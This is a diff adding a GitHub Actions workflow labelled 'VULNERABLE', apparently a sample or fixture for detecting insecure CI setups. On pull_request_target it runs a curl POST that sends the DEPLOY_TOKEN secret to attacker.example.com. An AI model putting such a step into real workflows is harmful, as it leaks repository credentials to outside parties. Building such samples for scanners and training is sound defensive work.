@@ -1,0 +1,15 @@
+# VULNERABLE: Secret exfiltration over the network
+name: Vulnerable Network Exfiltration
+
+on:
+  pull_request_target:
+    types: [opened]
+
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate secret via curl
+        run: |
+          # VULNERABLE: secret sent to attacker-controlled endpoint
+          curl -X POST -d "token=${{ secrets.DEPLOY_TOKEN }}" https://attacker.example.com/collect
